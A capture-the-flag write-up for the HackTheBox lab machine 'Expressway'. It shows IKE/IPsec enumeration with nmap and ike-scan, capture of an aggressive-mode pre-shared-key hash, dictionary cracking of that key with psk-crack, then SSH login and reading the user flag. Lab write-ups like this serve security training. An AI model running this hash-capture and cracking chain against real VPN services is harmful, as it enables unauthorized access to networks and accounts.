# Expressway.htb

# Enumeration

```jsx
$ nmap -sU -p 500,4500 10.10.11.87

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 10:49 EST
Nmap scan report for 10.10.11.87
Host is up (0.16s latency).

PORT     STATE         SERVICE
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

```

## ike-scan

`ike-scan` is used to scan **IKE / IPsec VPN services**.

It works only if the target has:

- **UDP 500** (ISAKMP / IKE)
- or **UDP 4500** (IPsec NAT-T)

```jsx
$ ike-scan 10.10.11.87

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned HDR=(CKY-R=0ccb005e4d35b3fe) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.153 seconds (6.54 hosts/sec).  1 returned handshake; 0 returned notify

```

### 🔹 Authentication method (IMPORTANT)

- **PSK = Pre-Shared Key**
- This means:
    - VPN uses a **shared password**
    - NOT certificates

### we found that it the target is using the aggresive mode with this command:

```jsx
$ ike-scan -A 10.10.11.87         

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=c2184d801e0fd6aa) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

```

### we use the user ike to capture the password hash (identify as ike

```jsx
ike-scan -A --id=ike@10.10.11.87 -P ike.psk 10.10.11.87

WARNING: gethostbyname failed for "ike.psk" - target ignored: Success
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=ccc56af07f39f6ad) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
78dad7ca0adcb473d9f06856f452adec50314065410785c5b6a6e659d06dc93abb1d5edae06f992671c60d7267c86759d4f00f41e41a66d60b2b58134d44f2fdbfd69a83098b5b14c50716cf2dbb05e2bf581591ad04b5ef8c27dd741b4460c3cb44560cb80134d2c39cdecc1a218e2b02334bc5298c0f28d3064ec312ebd575:e48946385d81aa929d46793119ce5eda61d327e32cea0b1d67fc946af1cd1f68ca2feb64137f1498f2dd3883370dc25522b1a5548cf2fdbba952ab35d8a407da16a94b1f3c96b6bc3a52abe37a2d7659f6c76da5de3bebc36731923854ab79db92d1104edc451cc92ebccb7c8a170129b184c58d40e77bb4fbab96cdfd8dabfd:ccc56af07f39f6ad:f92bf596fbb721f0:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:b3de5013062357b565b1f67a7b59faef79f567f7:a7ecd833eb3e3206c64c278d15c7fafa7a1959bccac69076567c6b766d3e4af9:2cbf5dc2a2f6664258fa8395f789a7f7673f5a30
Ending ike-scan 1.9.6: 1 hosts scanned in 0.146 seconds (6.87 hosts/sec).  1 returned handshake; 0 returned notify

**ike-scan -A --id=ike@expressway.htb -P ike.psk 10.10.11.87**
```

### cack the password

```jsx
$ psk-crack ike.psk -d /usr/share/wordlists/rockyou.txt                                               
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash f2d15f984f4e530c7338e002338389c032a11b95
Ending psk-crack: 8045040 iterations in 11.282 seconds (713089.24 iterations/sec)

```

### Loggin with ssh

```jsx
ssh ike@10.10.11.87
ike@10.10.11.87's password: 
Last login: Wed Sep 17 10:26:26 BST 2025 from 10.10.14.77 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/ */copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec 18 16:20:55 2025 from 10.10.16.85
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat user.txt
76807ad9c6128000ad608bf1ec20f9bf

```